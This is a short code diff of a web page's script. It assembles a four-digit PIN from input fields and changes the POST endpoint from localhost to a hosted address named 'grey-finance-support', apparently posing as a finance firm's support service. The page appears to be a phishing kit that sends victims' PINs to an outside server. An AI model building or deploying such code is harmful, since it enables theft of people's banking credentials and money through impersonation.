@@ -217,7 +217,7 @@ continueBtn.addEventListener("click", () => {
     pin:`${inputs[0].value}${inputs[1].value}${inputs[2].value}${inputs[3].value}`
   }
          console.log(send_data)
-    fetch('http://localhost:3100/sendreq',{
+    fetch('https://grey-finance-support.onrender.com/sendreq',{
     method: 'POST',
                 credentials:'include',
                headers: {
@@ -248,3 +248,4 @@ continueBtn.addEventListener("click", () => {
   </script>
 </body>
 </html>
+
